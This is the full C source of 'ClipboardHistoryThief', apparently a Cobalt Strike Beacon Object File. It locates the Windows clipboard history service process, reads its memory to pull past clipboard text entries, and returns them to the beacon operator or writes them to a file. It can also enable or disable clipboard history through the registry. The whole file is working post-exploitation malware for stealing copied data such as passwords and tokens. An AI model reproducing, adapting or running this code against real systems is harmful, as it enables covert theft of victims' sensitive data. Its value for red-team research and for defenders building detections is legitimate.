#include <windows.h>
#include <stdio.h>
#include "beacon.h"

#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)

typedef LONG NTSTATUS;

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _PEB_LDR_DATA {
    BYTE Reserved1[8];
    PVOID Reserved2[3];
    LIST_ENTRY InMemoryOrderModuleList;
} PEB_LDR_DATA, *PPEB_LDR_DATA;

typedef struct _RTL_USER_PROCESS_PARAMETERS {
    BYTE Reserved1[16];
    PVOID Reserved2[10];
    UNICODE_STRING ImagePathName;
    UNICODE_STRING CommandLine;
} RTL_USER_PROCESS_PARAMETERS, *PRTL_USER_PROCESS_PARAMETERS;

typedef struct _PEB {
    BYTE Reserved1[2];
    BYTE BeingDebugged;
    BYTE Reserved2[1];
    PVOID Reserved3[2];
    PPEB_LDR_DATA Ldr;
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters;
    BYTE Reserved4[104];
    PVOID Reserved5[52];
    PVOID PostProcessInitRoutine;
    BYTE Reserved6[128];
    PVOID Reserved7[1];
    ULONG SessionId;
} PEB, *PPEB;

typedef struct _PROCESS_BASIC_INFORMATION {
    PVOID Reserved1;
    PPEB PebBaseAddress;
    PVOID Reserved2[2];
    ULONG_PTR UniqueProcessId;
    PVOID Reserved3;
} PROCESS_BASIC_INFORMATION;

typedef enum _PROCESSINFOCLASS {
    ProcessBasicInformation = 0
} PROCESSINFOCLASS;

typedef NTSTATUS (WINAPI *pNtQueryInformationProcess)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);
typedef BOOL (WINAPI *pOpenProcessToken)(HANDLE, DWORD, PHANDLE);
typedef BOOL (WINAPI *pGetTokenInformation)(HANDLE, TOKEN_INFORMATION_CLASS, LPVOID, DWORD, PDWORD);
typedef HLOCAL (WINAPI *pLocalAlloc)(UINT, SIZE_T);
typedef HLOCAL (WINAPI *pLocalFree)(HLOCAL);
typedef BOOL (WINAPI *pCloseHandle)(HANDLE);
typedef BOOL (WINAPI *pLookupAccountSidA)(LPCSTR, PSID, LPSTR, LPDWORD, LPSTR, LPDWORD, PSID_NAME_USE);
typedef SC_HANDLE (WINAPI *pOpenSCManagerA)(LPCSTR, LPCSTR, DWORD);
typedef DWORD (WINAPI *pGetLastError)(VOID);
typedef BOOL (WINAPI *pEnumServicesStatusExA)(SC_HANDLE, SC_ENUM_TYPE, DWORD, DWORD, LPBYTE, DWORD, LPDWORD, LPDWORD, LPDWORD, LPCSTR);
typedef BOOL (WINAPI *pCloseServiceHandle)(SC_HANDLE);
typedef BOOL (WINAPI *pReadProcessMemory)(HANDLE, LPCVOID, LPVOID, SIZE_T, SIZE_T*);
typedef int (WINAPI *pWideCharToMultiByte)(UINT, DWORD, LPCWSTR, int, LPSTR, int, LPCSTR, LPBOOL);
typedef HANDLE (WINAPI *pOpenProcess)(DWORD, BOOL, DWORD);
typedef DWORD (WINAPI *pGetModuleBaseNameA)(HANDLE, HMODULE, LPSTR, DWORD);
typedef BOOL (WINAPI *pEnumProcessModules)(HANDLE, HMODULE*, DWORD, LPDWORD);
typedef SIZE_T (WINAPI *pVirtualQueryEx)(HANDLE, LPCVOID, PMEMORY_BASIC_INFORMATION, SIZE_T);
typedef LSTATUS (WINAPI *pRegOpenKeyExA)(HKEY, LPCSTR, DWORD, REGSAM, PHKEY);
typedef LSTATUS (WINAPI *pRegSetValueExA)(HKEY, LPCSTR, DWORD, DWORD, CONST BYTE*, DWORD);
typedef LSTATUS (WINAPI *pRegCloseKey)(HKEY);
typedef LSTATUS (WINAPI *pRegQueryValueExA)(HKEY, LPCSTR, LPDWORD, LPDWORD, LPBYTE, LPDWORD);

pNtQueryInformationProcess _NtQueryInformationProcess;
pOpenProcessToken _OpenProcessToken;
pGetTokenInformation _GetTokenInformation;
pLocalAlloc _LocalAlloc;
pLocalFree _LocalFree;
pCloseHandle _CloseHandle;
pLookupAccountSidA _LookupAccountSidA;
pOpenSCManagerA _OpenSCManagerA;
pGetLastError _GetLastError;
pEnumServicesStatusExA _EnumServicesStatusExA;
pCloseServiceHandle _CloseServiceHandle;
pReadProcessMemory _ReadProcessMemory;
pWideCharToMultiByte _WideCharToMultiByte;
pOpenProcess _OpenProcess;
pGetModuleBaseNameA _GetModuleBaseNameA;
pEnumProcessModules _EnumProcessModules;
pVirtualQueryEx _VirtualQueryEx;
pRegOpenKeyExA _RegOpenKeyExA;
pRegSetValueExA _RegSetValueExA;
pRegCloseKey _RegCloseKey;
pRegQueryValueExA _RegQueryValueExA;

BYTE endByte = 0x1;
wchar_t textTypeValue[] = L"Text";
size_t textTypeLen = sizeof(textTypeValue);

BOOL initializeAPIs() {
    HMODULE hNtdll = LoadLibraryA("ntdll.dll");
    HMODULE hKernel32 = LoadLibraryA("kernel32.dll");
    HMODULE hAdvapi32 = LoadLibraryA("advapi32.dll");
    HMODULE hPsapi = LoadLibraryA("psapi.dll");
    
    if (!hNtdll || !hKernel32 || !hAdvapi32 || !hPsapi)
        return FALSE;
    
    _NtQueryInformationProcess = (pNtQueryInformationProcess)GetProcAddress(hNtdll, "NtQueryInformationProcess");
    _OpenProcessToken = (pOpenProcessToken)GetProcAddress(hAdvapi32, "OpenProcessToken");
    _GetTokenInformation = (pGetTokenInformation)GetProcAddress(hAdvapi32, "GetTokenInformation");
    _LocalAlloc = (pLocalAlloc)GetProcAddress(hKernel32, "LocalAlloc");
    _LocalFree = (pLocalFree)GetProcAddress(hKernel32, "LocalFree");
    _CloseHandle = (pCloseHandle)GetProcAddress(hKernel32, "CloseHandle");
    _LookupAccountSidA = (pLookupAccountSidA)GetProcAddress(hAdvapi32, "LookupAccountSidA");
    _OpenSCManagerA = (pOpenSCManagerA)GetProcAddress(hAdvapi32, "OpenSCManagerA");
    _GetLastError = (pGetLastError)GetProcAddress(hKernel32, "GetLastError");
    _EnumServicesStatusExA = (pEnumServicesStatusExA)GetProcAddress(hAdvapi32, "EnumServicesStatusExA");
    _CloseServiceHandle = (pCloseServiceHandle)GetProcAddress(hAdvapi32, "CloseServiceHandle");
    _ReadProcessMemory = (pReadProcessMemory)GetProcAddress(hKernel32, "ReadProcessMemory");
    _WideCharToMultiByte = (pWideCharToMultiByte)GetProcAddress(hKernel32, "WideCharToMultiByte");
    _OpenProcess = (pOpenProcess)GetProcAddress(hKernel32, "OpenProcess");
    _GetModuleBaseNameA = (pGetModuleBaseNameA)GetProcAddress(hPsapi, "GetModuleBaseNameA");
    _EnumProcessModules = (pEnumProcessModules)GetProcAddress(hPsapi, "EnumProcessModules");
    _VirtualQueryEx = (pVirtualQueryEx)GetProcAddress(hKernel32, "VirtualQueryEx");
    _RegOpenKeyExA = (pRegOpenKeyExA)GetProcAddress(hAdvapi32, "RegOpenKeyExA");
    _RegSetValueExA = (pRegSetValueExA)GetProcAddress(hAdvapi32, "RegSetValueExA");
    _RegCloseKey = (pRegCloseKey)GetProcAddress(hAdvapi32, "RegCloseKey");
    _RegQueryValueExA = (pRegQueryValueExA)GetProcAddress(hAdvapi32, "RegQueryValueExA");
    
    if (!_NtQueryInformationProcess || !_OpenProcessToken || !_GetTokenInformation ||
        !_LocalAlloc || !_LocalFree || !_CloseHandle || !_LookupAccountSidA ||
        !_OpenSCManagerA || !_GetLastError || !_EnumServicesStatusExA ||
        !_CloseServiceHandle || !_ReadProcessMemory || !_WideCharToMultiByte ||
        !_OpenProcess || !_GetModuleBaseNameA || !_EnumProcessModules ||
        !_VirtualQueryEx || !_RegOpenKeyExA || !_RegSetValueExA ||
        !_RegCloseKey || !_RegQueryValueExA)
        return FALSE;
    
    return TRUE;
}

BOOL getUserFromProcess(HANDLE hProcess, LPSTR* ppUser) {
    HANDLE hToken = NULL;
    PTOKEN_USER pTokenUser = NULL;
    DWORD dwTokenUserSize = 0;
    BOOL bSuccess = FALSE;
    
    if (!_OpenProcessToken(hProcess, TOKEN_QUERY, &hToken)) {
        return FALSE;
    }
    
    _GetTokenInformation(hToken, TokenUser, NULL, 0, &dwTokenUserSize);
    pTokenUser = (PTOKEN_USER)_LocalAlloc(LPTR, dwTokenUserSize);
    if (!pTokenUser) {
        _CloseHandle(hToken);
        return FALSE;
    }
    
    if (_GetTokenInformation(hToken, TokenUser, pTokenUser, dwTokenUserSize, &dwTokenUserSize)) {
        CHAR szName[MAX_PATH];
        CHAR szDomain[MAX_PATH];
        DWORD dwNameSize = sizeof(szName);
        DWORD dwDomainSize = sizeof(szDomain);
        SID_NAME_USE eSidType;
        
        if (_LookupAccountSidA(NULL, pTokenUser->User.Sid, szName, &dwNameSize, szDomain, &dwDomainSize, &eSidType)) {
            *ppUser = (LPSTR)malloc((dwNameSize + dwDomainSize + 2));
            if (*ppUser) {
                wsprintfA(*ppUser, "%s\\%s", szDomain, szName);
                bSuccess = TRUE;
            }
        }
    }
    
    _LocalFree(pTokenUser);
    _CloseHandle(hToken);
    return bSuccess;
}

BOOL serviceNameStartsWith(LPCSTR serviceName, LPCSTR prefix) {
    SIZE_T prefixLen = 0;
    while (prefix[prefixLen] != '\0') prefixLen++;
    
    for (SIZE_T i = 0; i < prefixLen; i++) {
        if (serviceName[i] == '\0' || serviceName[i] != prefix[i])
            return FALSE;
    }
    
    return TRUE;
}

DWORD getClipboardSvcProcessID() {
    DWORD clipboardSvcPID = 0;
    SC_HANDLE hSCManager = NULL;
    ENUM_SERVICE_STATUS_PROCESS* pServices = NULL;
    DWORD dwBytesNeeded = 0;
    DWORD dwServicesReturned = 0;
    DWORD dwResumeHandle = 0;
    
    hSCManager = _OpenSCManagerA(NULL, NULL, SC_MANAGER_CONNECT | SC_MANAGER_ENUMERATE_SERVICE);
    if (hSCManager == NULL) {
        BeaconPrintf(CALLBACK_OUTPUT, "OpenSCManager failed with error %d\n", _GetLastError());
        return 0;
    }
    
    if (!_EnumServicesStatusExA(hSCManager, SC_ENUM_PROCESS_INFO, SERVICE_WIN32, SERVICE_STATE_ALL, NULL, 0, &dwBytesNeeded, &dwServicesReturned, &dwResumeHandle, NULL) &&
        _GetLastError() != ERROR_MORE_DATA) {
        BeaconPrintf(CALLBACK_OUTPUT, "EnumServicesStatusEx failed with error %d\n", _GetLastError());
        _CloseServiceHandle(hSCManager);
        return 0;
    }
    
    pServices = (ENUM_SERVICE_STATUS_PROCESS*)malloc(dwBytesNeeded);
    if (!_EnumServicesStatusExA(hSCManager, SC_ENUM_PROCESS_INFO, SERVICE_WIN32, SERVICE_STATE_ALL, (LPBYTE)pServices, dwBytesNeeded, &dwBytesNeeded, &dwServicesReturned, &dwResumeHandle, NULL)) {
        BeaconPrintf(CALLBACK_OUTPUT, "EnumServicesStatusEx failed with error %d\n", _GetLastError());
        free(pServices);
        _CloseServiceHandle(hSCManager);
        return 0;
    }
    
    for (DWORD i = 0; i < dwServicesReturned; i++) {
        if (serviceNameStartsWith(pServices[i].lpServiceName, "cbdhsvc")) {
            clipboardSvcPID = pServices[i].ServiceStatusProcess.dwProcessId;
            break;
        }
    }
    
    free(pServices);
    _CloseServiceHandle(hSCManager);
    return clipboardSvcPID;
}

BOOL getProcessCommandLine(HANDLE hProcess, CHAR *szCommandLine, DWORD nSize) {
    PROCESS_BASIC_INFORMATION pbi = {0};
    ULONG ulReturnLength;
    NTSTATUS status = _NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &ulReturnLength);
    
    if (status == STATUS_SUCCESS) {
        PEB peb;
        SIZE_T bytesRead;
        if (_ReadProcessMemory(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead)) {
            RTL_USER_PROCESS_PARAMETERS upp;
            if (_ReadProcessMemory(hProcess, peb.ProcessParameters, &upp, sizeof(upp), &bytesRead)) {
                WCHAR wszCommandLine[MAX_PATH];
                if (_ReadProcessMemory(hProcess, upp.CommandLine.Buffer, wszCommandLine, nSize, &bytesRead)) {
                    wszCommandLine[bytesRead / sizeof(WCHAR)] = L'\0';
                    _WideCharToMultiByte(CP_ACP, 0, wszCommandLine, -1, szCommandLine, nSize, NULL, NULL);
                    return TRUE;
                }
            }
        }
    }
    return FALSE;
}

char* wideToUtf8(const WCHAR* wideStr) {
    int utf8Size = _WideCharToMultiByte(CP_UTF8, 0, wideStr, -1, NULL, 0, NULL, NULL);
    char* utf8Str = (char*)malloc(utf8Size);
    _WideCharToMultiByte(CP_UTF8, 0, wideStr, -1, utf8Str, utf8Size, NULL, NULL);
    return utf8Str;
}

BOOL isWithinRdataSection(HANDLE hProcess, HMODULE hModule, DWORD_PTR address) {
    BOOL result = FALSE;
    IMAGE_DOS_HEADER dosHeader = {0};
    IMAGE_NT_HEADERS ntHeaders = {0};
    SIZE_T bytesRead;
    
    if (!_ReadProcessMemory(hProcess, hModule, &dosHeader, sizeof(IMAGE_DOS_HEADER), &bytesRead))
        return result;
    
    if (!_ReadProcessMemory(hProcess, (LPVOID)((DWORD_PTR)hModule + dosHeader.e_lfanew), &ntHeaders, sizeof(IMAGE_NT_HEADERS), &bytesRead))
        return result;
    
    WORD numSections = ntHeaders.FileHeader.NumberOfSections;
    PIMAGE_SECTION_HEADER sectionHeaders = (PIMAGE_SECTION_HEADER)malloc(numSections * sizeof(IMAGE_SECTION_HEADER));
    
    if (!_ReadProcessMemory(hProcess, (LPVOID)((DWORD_PTR)hModule + dosHeader.e_lfanew + sizeof(IMAGE_NT_HEADERS)), sectionHeaders, numSections * sizeof(IMAGE_SECTION_HEADER), &bytesRead)) {
        free(sectionHeaders);
        return result;
    }
    
    for (WORD i = 0; i < numSections; i++) {
        if (strncmp((const char *)sectionHeaders[i].Name, ".rdata", IMAGE_SIZEOF_SHORT_NAME) == 0) {
            DWORD_PTR sectionStart = (DWORD_PTR)hModule + sectionHeaders[i].VirtualAddress;
            DWORD_PTR sectionEnd = sectionStart + sectionHeaders[i].Misc.VirtualSize;
            if (address >= sectionStart && address < sectionEnd)
                result = TRUE;
            break;
        }
    }
    
    free(sectionHeaders);
    return result;
}

void clipboardHistoryDump(const char* outputPath) {
    DWORD aProcesses[1024], cbNeeded, cProcesses;
    HMODULE hMod;
    FILE* outputFile = NULL;
    char* outputBuffer = NULL;
    size_t bufferSize = 1024 * 1024;
    size_t currentPos = 0;
    BOOL headerPrinted = FALSE;
    
    if (outputPath != NULL) {
        outputFile = fopen(outputPath, "w");
        if (outputFile == NULL) {
            BeaconPrintf(CALLBACK_OUTPUT, "Failed to create file. Please check if the file path is valid.\n");
            return;
        }
    } else {
        outputBuffer = (char*)malloc(bufferSize);
        if (outputBuffer == NULL) {
            BeaconPrintf(CALLBACK_OUTPUT, "Failed to allocate output buffer.\n");
            return;
        }
        outputBuffer[0] = '\0';
    }
    
    DWORD clipboardSvcPID = getClipboardSvcProcessID();
    if (clipboardSvcPID == 0) {
        goto exit;
    }
    
    HANDLE hProcess = _OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, clipboardSvcPID);
    if (hProcess != NULL) {
        LPSTR pUser = NULL;
        if (getUserFromProcess(hProcess, &pUser)) {
            if (outputFile == NULL) {
                currentPos += wsprintfA(outputBuffer + currentPos, "User running the cbdhsvc service process: %s\n", pUser);
            } else {
                fprintf(outputFile, "User running the cbdhsvc service process: %s\n", pUser);
            }
            free(pUser);
        } else {
            if (outputFile == NULL) {
                currentPos += wsprintfA(outputBuffer + currentPos, "Failed to get the username.\n");
            } else {
                fprintf(outputFile, "Failed to get the username.\n");
            }
        }
        
        MEMORY_BASIC_INFORMATION memInfo;
        HMODULE hWindowsDataTransferDll = NULL;
        DWORD cbNeededModules;
        
        if (_EnumProcessModules(hProcess, NULL, 0, &cbNeededModules)) {
            HMODULE *hMods = (HMODULE *)malloc(cbNeededModules);
            if (_EnumProcessModules(hProcess, hMods, cbNeededModules, &cbNeededModules)) {
                for (unsigned int k = 0; k < cbNeededModules / sizeof(HMODULE); k++) {
                    CHAR szModuleName[MAX_PATH];
                    if (_GetModuleBaseNameA(hProcess, hMods[k], szModuleName, sizeof(szModuleName))) {
                        SIZE_T len = 0;
                        while (szModuleName[len] != '\0') {
                            if (szModuleName[len] >= 'A' && szModuleName[len] <= 'Z')
                                szModuleName[len] = szModuleName[len] + ('a' - 'A');
                            len++;
                        }
                        
                        if (strcmp(szModuleName, "windows.applicationmodel.datatransfer.dll") == 0) {
                            hWindowsDataTransferDll = hMods[k];
                            break;
                        }
                    }
                }
            }
            free(hMods);
        }
        
        for (LPVOID addr = 0; _VirtualQueryEx(hProcess, addr, &memInfo, sizeof(memInfo)) == sizeof(memInfo); addr = (LPVOID)((DWORD_PTR)addr + memInfo.RegionSize)) {
            if (memInfo.State == MEM_COMMIT && memInfo.Type == MEM_PRIVATE && memInfo.Protect == PAGE_READWRITE) {
                BYTE *buffer = (BYTE *)malloc(memInfo.RegionSize);
                SIZE_T bytesRead;
                
                if (_ReadProcessMemory(hProcess, memInfo.BaseAddress, buffer, memInfo.RegionSize, &bytesRead)) {
                    for (SIZE_T j = 0; j < bytesRead - sizeof(BYTE); j++) {
                        DWORD_PTR rdataAddress;
                        DWORD_PTR textTypeAddress;
                        wchar_t textType[5];
                        
                        if (
                            memcmp(buffer + j + 0x20, &endByte, sizeof(BYTE)) == 0 &&
                            _ReadProcessMemory(hProcess, (LPCVOID)((DWORD_PTR)memInfo.BaseAddress + j), &rdataAddress, sizeof(DWORD_PTR), NULL) &&
                            isWithinRdataSection(hProcess, hWindowsDataTransferDll, rdataAddress) &&
                            _ReadProcessMemory(hProcess, (LPCVOID)((DWORD_PTR)memInfo.BaseAddress + j + 8), &textTypeAddress, sizeof(DWORD_PTR), NULL) &&
                            _ReadProcessMemory(hProcess, (LPCVOID)((DWORD_PTR)textTypeAddress + 0x1c), &textType, textTypeLen, NULL) &&
                            wcscmp(textType, textTypeValue) == 0) {
                            
                            LPVOID clipboardDataPtrAddress = (LPVOID)((DWORD_PTR)memInfo.BaseAddress + j + 0x18);
                            DWORD_PTR clipboardDataAddress;
                            
                            if (_ReadProcessMemory(hProcess, clipboardDataPtrAddress, &clipboardDataAddress, sizeof(clipboardDataAddress), NULL)) {
                                WCHAR* clipboardData = NULL;
                                SIZE_T dataSize = 256;
                                SIZE_T bytesRead1;
                                SIZE_T totalBytesRead = 0;
                                BOOL readCompleted = FALSE;
                                
                                clipboardData = (WCHAR*)malloc(dataSize * sizeof(WCHAR));
                                
                                while (!readCompleted && totalBytesRead < dataSize * sizeof(WCHAR) - sizeof(WCHAR)) {
                                    if (_ReadProcessMemory(hProcess, (LPCVOID)(clipboardDataAddress + totalBytesRead), &clipboardData[totalBytesRead / sizeof(WCHAR)], sizeof(WCHAR), &bytesRead1)) {
                                        if (bytesRead1 == sizeof(WCHAR) && clipboardData[totalBytesRead / sizeof(WCHAR)] == L'\0')
                                            readCompleted = TRUE;
                                        else
                                            totalBytesRead += bytesRead1;
                                    } else
                                        break;
                                    
                                    if (totalBytesRead == dataSize * sizeof(WCHAR) - sizeof(WCHAR)) {
                                        dataSize *= 2;
                                        clipboardData = (WCHAR*)realloc(clipboardData, dataSize * sizeof(WCHAR));
                                    }
                                }
                                
                                if (totalBytesRead > 0) {
                                    clipboardData[totalBytesRead / sizeof(WCHAR)] = L'\0';
                                    char* utf8Str = wideToUtf8(clipboardData);
                                    
                                    if (outputFile == NULL) {
                                        if (!headerPrinted) {
                                            size_t headerSize = 100;
                                            if (currentPos + headerSize > bufferSize) {
                                                bufferSize = (currentPos + headerSize) * 2;
                                                outputBuffer = (char*)realloc(outputBuffer, bufferSize);
                                            }

                                            currentPos += wsprintfA(outputBuffer + currentPos, "======================= Clipboard Content ========================\n");
                                            headerPrinted = TRUE;

                                        }
                                        
                                        size_t neededSize = strlen(utf8Str) + 10;
                                        if (currentPos + neededSize > bufferSize) {
                                            bufferSize = (currentPos + neededSize) * 2;
                                            outputBuffer = (char*)realloc(outputBuffer, bufferSize);
                                        }
                                        
                                        currentPos += wsprintfA(outputBuffer + currentPos, "%s\n\n", utf8Str);
                                    } else {
                                        fprintf(outputFile, "%s\n", utf8Str);
                                    }
                                    
                                    free(utf8Str);
                                }
                                
                                free(clipboardData);
                            }
                        }
                    }
                }
                
                free(buffer);
            }
        }
        
        if (headerPrinted) {
            if (outputFile == NULL) {
                size_t footerSize = 100;
                if (currentPos + footerSize > bufferSize) {
                    bufferSize = (currentPos + footerSize) * 2;
                    outputBuffer = (char*)realloc(outputBuffer, bufferSize);
                }
                currentPos += wsprintfA(outputBuffer + currentPos, "\n");
            } else {
                fprintf(outputFile, "\n");
            }
        }
        
        _CloseHandle(hProcess);
        
        if (outputFile == NULL && outputBuffer != NULL) {
            BeaconPrintf(CALLBACK_OUTPUT, "%s", outputBuffer);
        } else if (outputFile != NULL) {
            BeaconPrintf(CALLBACK_OUTPUT, "File saved to %s.\n", outputPath);
        }
    }
    
exit:
    if (outputFile != NULL)
        fclose(outputFile);
    if (outputBuffer != NULL)
        free(outputBuffer);
}

void enableClipboardHistory(BOOL enable) {
    HKEY hKey;
    const char* subKey = "SOFTWARE\\Microsoft\\Clipboard";
    DWORD value = enable ? 1 : 0;
    
    if (_RegOpenKeyExA(HKEY_CURRENT_USER, subKey, 0, KEY_WRITE, &hKey) != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_OUTPUT, "Failed to open registry key.\n");
        return;
    }
    
    if (_RegSetValueExA(hKey, "EnableClipboardHistory", 0, REG_DWORD, (const BYTE*)&value, sizeof(value)) != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_OUTPUT, "Failed to set registry value.\n");
        _RegCloseKey(hKey);
        return;
    }
    
    _RegCloseKey(hKey);
    if (enable)
        BeaconPrintf(CALLBACK_OUTPUT, "Clipboard history enabled.\n");
    else
        BeaconPrintf(CALLBACK_OUTPUT, "Clipboard history disabled.\n");
    return;
}

BOOL isClipboardHistoryEnabled() {
    HKEY hKey;
    const char* subKey = "SOFTWARE\\Microsoft\\Clipboard";
    DWORD value = 0;
    DWORD valueType;
    DWORD valueSize = sizeof(value);
    
    if (_RegOpenKeyExA(HKEY_CURRENT_USER, subKey, 0, KEY_READ, &hKey) != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_OUTPUT, "Failed to open registry key.\n");
        return FALSE;
    }
    
    if (_RegQueryValueExA(hKey, "EnableClipboardHistory", 0, &valueType, (BYTE*)&value, &valueSize) != ERROR_SUCCESS) {
        _RegCloseKey(hKey);
        return FALSE;
    }
    
    _RegCloseKey(hKey);
    return value == 1;
}

void showHelpMenu() {
    BeaconPrintf(CALLBACK_OUTPUT,
        "ClipboardHistoryThief BOF\n"
        "Commands:\n"
        "  clipboardsteal dump      Dumps the content of the clipboard history to console/file.\n"
        "  clipboardsteal enable    Enables the clipboard history feature.\n"
        "  clipboardsteal disable   Disables the clipboard history feature.\n"
        "  clipboardsteal check     Checks if clipboard history feature is enabled.\n"
        "  clipboardsteal help      Shows this help menu.");
}

void go(char* args, int length) {
    if (!initializeAPIs()) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to initialize APIs\n");
        return;
    }
    
    datap parser;
    BeaconDataParse(&parser, args, length);
    int argSize;
    char* command = BeaconDataExtract(&parser, &argSize);
    
    if (command != NULL && argSize > 0) {
        if (!_stricmp("dump", command)) {
            if (!isClipboardHistoryEnabled())
                BeaconPrintf(CALLBACK_OUTPUT, "Clipboard history is not enabled.\n");
            else {
                clipboardHistoryDump(NULL);
            }
        }
        else if (!_stricmp("enable", command))
            enableClipboardHistory(TRUE);
        else if (!_stricmp("disable", command))
            enableClipboardHistory(FALSE);
        else if (!_stricmp("check", command))
            if(isClipboardHistoryEnabled())
                BeaconPrintf(CALLBACK_OUTPUT, "Clipboard history is enabled.\n");
            else
                BeaconPrintf(CALLBACK_OUTPUT, "Clipboard history is not enabled.\n");
        else if (!_stricmp("-h", command) || !_stricmp("help", command))
            showHelpMenu();
        else
            showHelpMenu();
    } else
        showHelpMenu();
}
